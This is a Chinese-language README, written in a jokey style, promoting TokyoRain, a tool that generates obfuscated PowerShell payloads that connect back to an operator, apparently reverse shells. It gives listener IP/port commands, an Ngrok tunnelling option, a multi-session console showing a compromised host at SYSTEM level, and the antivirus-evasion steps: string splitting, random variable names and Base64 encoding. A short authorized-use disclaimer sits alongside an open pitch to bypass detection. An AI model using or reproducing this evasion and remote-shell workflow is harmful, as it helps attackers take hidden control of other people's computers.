```markdown
🌧️⃟ TokyoRain - 让混淆的PowerShell载荷像雨点般隐秘渗透 ☔️

<p align="center">
  <img src="https://media.giphy.com/media/3o7abKhOpu0NwenH3O/giphy.gif" alt="digital rain">
</p>

[![GitHub stars](https://img.shields.io/github/stars/9Insomnie/TokyoRain?style=for-the-badge&color=0099ff)](https://github.com/9Insomnie/TokyoRain/stargazers)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)

## 🎩 这是什么魔法？

还在为反病毒软件的严格检测发愁？TokyoRain 来帮你「人工降雨」！通过动态字符串混淆和Ngrok隧道支持，让你的PowerShell载荷像雨点一样绕过检测，滋润你的红队行动~ 💻🌧️

```bash
# 基础咒语示例
python tokyo_rain.py -l 192.168.1.233 -p 3399
```

## 🚀 超能力清单

- 🎭 **动态变脸术**：每次生成的载荷都有新面孔，让检测引擎怀疑人生！
- 🌐 **Ngrok隧道快递**：内网穿透？我们包邮！（需自备Ngrok账号）
- 🕶️ **VIP会话包厢**：同时管理5个会话，每个攻击目标都有专属座位
- 🧩 **智能混淆算法**：把`New-Object`变成`N''e''w-O''bj''ec''t`之类的魔法文字游戏
- 🎨 **彩虹终端界面**：用Colorama绘制的彩色控制台，比黑白屏有趣100倍

## 🛠️ 安装指南

把这份「魔法配方」克隆到你的法术书（本地仓库）吧！

```bash
git clone https://github.com/9Insomnie/TokyoRain.git
cd TokyoRain/
pip install -r requirements.txt  # 安装魔法药水材料
```

## 🎮 使用说明书

### 基础模式
```bash
# 开启你的降雨仪式（记得替换IP哦~）
python tokyo_rain.py -l 192.168.1.666 -p 2333

# 想直接看「雨水源码」？加上-r参数！
python tokyo_rain.py -r raw
```

### 高级模式
```bash
# 启用Ngrok魔法隧道（需要先配置好Ngrok）
python tokyo_rain.py -n ngrok
```

### 控制台魔法秀
```
[成功] 接受来自 192.168.1.102:54188 的连接

活动会话 --> [会话ID::1, 192.168.1.102::54188 ]
[提示]: 按CTRL+C切换会话
[提示]: 输入0将终止所有会话
-----------------------------------------------
[?] 选择会话 (1-3) 或输入0退出: 1

192.168.1.102:54188 >>> [Tokio会话] 1: whoami
nt authority\system 🌟
```

## 🧙 魔法原理

### 混淆炼金术流程
1. **材料准备**：生成10个随机UUID作为混淆原料
2. **文字变形**：把敏感字符串变成`Syst??r??t`这样的谜语
3. **变量整容**：用`$3dbfe2ebffe072727`这样的神秘符号替换常规变量名
4. **最终附魔**：通过Base64编码把payload变成「天书」

### 会话管理秘籍
- 🎪 每个会话都是马戏团里的独立表演者
- 🤹 用数字键快速切换不同「杂技演员」
- 💫 `quit`命令是优雅的谢幕动作

## ⚠️ 安全须知

❗ 本工具仅限授权测试使用，擅自对他人系统「人工降雨」可能会被雷劈哦 ⚡  
❗ 生成payload前请确认自己在法律允许的「降雨区域」  
❗ 建议在隔离的「魔法练习场」（虚拟机环境）使用

## 🌈 贡献指南

欢迎提交你的「魔法改良配方」！请遵循以下步骤：
1. Fork 本魔法书
2. 创建新的魔法分支 (`git checkout -b feature/awesome-spell`)
3. 提交你的咒语改进 (`git commit -am 'Add fireball spell'`)
4. 推送魔法到云端 (`git push origin feature/awesome-spell`)
5. 发起Pull Request

## 📜 开源许可

本项目采用 MIT 许可证 - 详情请见 [LICENSE](LICENSE) 文件。  
Made with ❤️ by [9Insomnie](https://github.com/9Insomnie) | 灵感来自无数个不眠雨夜 🌧️

```

---

<p align="center">
  🌀 准备好了吗？让我们在数字世界的暴雨中起舞吧！ 💃🌧️🕺
</p>
```
